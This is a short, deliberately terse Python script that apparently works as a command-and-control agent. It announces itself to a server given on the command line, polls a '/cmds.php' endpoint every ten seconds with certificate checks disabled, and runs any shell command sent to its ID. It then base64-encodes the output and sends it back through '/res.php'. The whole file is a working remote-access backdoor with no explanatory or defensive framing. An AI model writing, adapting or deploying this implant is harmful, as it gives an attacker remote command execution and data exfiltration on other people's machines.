X=':'
W='&id='
V='/res.php?res='
J=False
H='ascii'
G=str
import requests as B,base64 as I,sys,time,subprocess as K
A=sys.argv[1]
C=sys.argv[2]
L='Hello From Agent '+A+' (Python)'
M=L.encode(H)
N=I.b64encode(M)
O=N.decode(H)
Y=B.get(C+V+O+W+A,verify=J)
while True:
	D=B.get(C+'/cmds.php?id='+A+'&o=P',verify=J);D=G(D.text)
	for E in D.splitlines():
		if G(A)in E:
			P=G(E.split(X,2)[1])
			if P=='run':Q=G(E.split(X,2)[2]);R=Q.split(' ');F=K.check_output(R);F=F.decode('utf-8');S=F.encode(H);T=I.b64encode(S);U=T.decode(H);Z=B.get(C+V+U+W+A,verify=J)
	time.sleep(10)
